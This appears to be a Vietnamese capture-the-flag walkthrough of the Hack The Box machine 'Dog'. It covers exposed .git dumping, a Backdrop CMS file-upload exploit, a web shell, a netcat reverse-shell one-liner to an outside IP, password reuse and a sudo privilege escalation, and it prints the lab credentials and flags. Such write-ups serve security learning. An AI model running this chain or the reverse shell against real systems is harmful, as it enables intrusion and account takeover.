# Dog

Đầu tiên mình sủ dụng nmap để scan các port đang ở của target thì thấy rằng có 2 công đang mở là công 22 chạy SSH và 80 chạy web server. Vì chưa có thông tin gì về username và password nên mình tạm thời bỏ quả port 22

![image](https://github.com/user-attachments/assets/216fd558-1d7a-4c18-9530-cc69a73d1ba3)

Sau một hồi test web không có gì đặc sắc thì mình thử sử dụng dirsearch để tìm các thư mục xem có gì không và kết quá là mình tìm thấy được đường dẫn .git. Đường dẫn này chứa thông tin về source code cũng như quá trình commit code.

![image](https://github.com/user-attachments/assets/b13056d8-dd0d-4836-b170-536371c8b570)

Mình sử dụng git-dumper để clone hết source code về bằng câu lệnh `git-dumper http://10.10.11.58/.git/ ../HTB/dog`

Sau khi có được source code mình thử tìm các file config hoặc setting để đọc thì thấy được rằng web server đang sử dụng Backdrop CMS và có một email rất có thể là của admin

![image](https://github.com/user-attachments/assets/40458660-def1-467a-a546-fc53c88e0218)

Trong file settings.php mình thu được thông tin về account database.

![image](https://github.com/user-attachments/assets/241cb0f7-d7ed-47c9-80e5-36261143ab52)

Sau một hồi thử thì mình xác định được tài khoản là tiffany và mật khẩu là BackDropJ2024DS2024

Sau khi đăng nhập thành công thì mình được chuyển đến trang chủ quản lí.

Mình dạo một vòng thì thấy web đang sử dụng Backdrop v 1.27.1

![image](https://github.com/user-attachments/assets/6d113416-662c-449c-bf10-3482a13ad202)

Thử tìm kiếm lỗ hổng thì mình thấy có POC trên [GD](https://www.exploit-db.com/exploits/52021). Đây là lỗi liên quan đến upload file nên mình tìm các chức năng có liên quan đến upload file thì thấy chức năng này tồn tại tại đường dẫn http://10.10.11.58/?q=admin/installer/manual.

Tải source về và chạy thôi.

![image](https://github.com/user-attachments/assets/52a648d8-2b64-4aee-b180-18d4e259b813)

Sau khi chạy xong sẽ có 1 file zip và một folder được sinh ra. Do ứng dụng không cho phép upload file zip nên ta phải nén lại sang định dạng tar.gz

Upload file vừa nén lên sau đó truy cập đến đường dẫn http://10.10.11.58/modules/shell/shell.php.

Sau một hồi tìm kiếm cũng như tham khảo mình thấy có đoạn shell sau có thể sử dụng

`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.10 5555 > /tmp/f`

![image](https://github.com/user-attachments/assets/004ece0f-29f0-47f2-8229-c48c1a5713d5)

kết nối thành công

Sử dụng `bash -i` để tạo terminal cho dễ nhìn

Từ đây mình đi tìm user flag thôi. Bài này thì flag nằm ở trong thư mục của user johncusack. Nhưng mình không có quyền đọc. Sau khi tìm kiếm một hồi thì mình thầy có khả năng tài khoản này sử dụng chung mật khẩu với admin ở trên nên mình thử lại và thành công đăng nhập vào tài khoản của user johncusack

Đăng nhập vào và lấy flag thôi.

*User flag: 6b4a03d2d4eeaa948f842a86b618f9c7*

Để tìm root flag thì mình thử chạy lệnh `sudo -l` để xem các lệnh mà user này có thể chạy với quyền root. Sau khi chạy lệnh này thì mình thấy rằng có một ứng dụng là /usr/local/bin/bee có thể chạy với quyền root

Sau khi chạy thử để xem hướng dẫn thì mình thấy có một chức năng thực hiện code

![image](https://github.com/user-attachments/assets/1de9d4c2-970c-412c-ab79-5e2db5c190d9)

Kiểm tra thử mình thấy rằng đã leo thang thành công

![image](https://github.com/user-attachments/assets/d2c67c8e-9707-4bb2-97d0-f29c4d6cf5fd)

Việc cuối cùng là vào /root đọc flag thôi

*Root flag: b8c104551d2b1075288f4486c0ec294d*



















